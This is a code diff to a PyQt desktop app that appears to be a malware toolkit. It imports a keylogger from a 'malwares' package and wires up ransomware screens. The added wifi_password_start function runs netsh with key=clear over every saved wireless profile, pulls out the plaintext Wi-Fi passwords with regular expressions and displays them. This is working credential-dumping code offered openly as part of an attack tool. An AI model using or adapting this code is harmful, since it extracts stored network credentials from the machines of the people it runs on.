@@ -7,6 +7,8 @@ import sys
 
 import os
 from threading import Thread, Timer
+import subprocess
+import re
 
 from malwares.keylogger.keylogger import start_keylogger
 
@@ -83,9 +85,10 @@ class App(QMainWindow):
         self.r_6 = self.findChild(QPushButton, "ransom_bt__6").clicked.connect(self.ransom_return)
 
         # wifi
-        self.wifi_button = self.findChild(QPushButton, "wifi_button")
-        self.wifi_output = self.findChild(QPushButton, "wifi_output")
-
+        self.wifi_button = self.findChild(QPushButton, "wifi_button_start")
+        self.wifi_button.clicked.connect(self.wifi_password_start)
+        self.wifi_output = self.findChild(QTextEdit, "wifi_output")
+        self.wifi_text = ''
         # zip
         self.zip_path_label = self.findChild(QLabel, "file_label")
         self.zip_find_file = self.findChild(QPushButton, "find_file")
@@ -136,6 +139,40 @@ class App(QMainWindow):
 
     def ransom_return(self):
         self.r_stack.setCurrentWidget(self.findChild(QWidget, "ransom_1"))
+
+    def wifi_password_start(self):
+
+        self.wifi_text = ''
+        command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
+        profile_names = (re.findall("All User Profile     : (.*)\r", command_output))
+
+        wifi_list = []
+
+        if len(profile_names) != 0:
+            for name in profile_names:
+
+                wifi_profile = {}
+
+                profile_info = subprocess.run(["netsh", "wlan", "show", "profile", name], capture_output=True).stdout.decode()
+
+                if re.search("Security key           : Absent", profile_info):
+                    continue
+                else:
+
+                    wifi_profile["ssid"] = name
+                    profile_info_pass = subprocess.run(["netsh", "wlan", "show", "profile", name, "key=clear"],
+                                                       capture_output=True).stdout.decode()
+                    password = re.search("Key Content            : (.*)\r", profile_info_pass)
+                    if password is None:
+                        wifi_profile["password"] = None
+                    else:
+                        wifi_profile["password"] = password[1]
+                    wifi_list.append(wifi_profile)
+
+        for x in range(len(wifi_list)):
+            self.wifi_text += str(wifi_list[x]) + '\n'
+            print("start")
+        self.wifi_output.setText(self.wifi_text)
 
 
 app = QApplication(sys.argv)
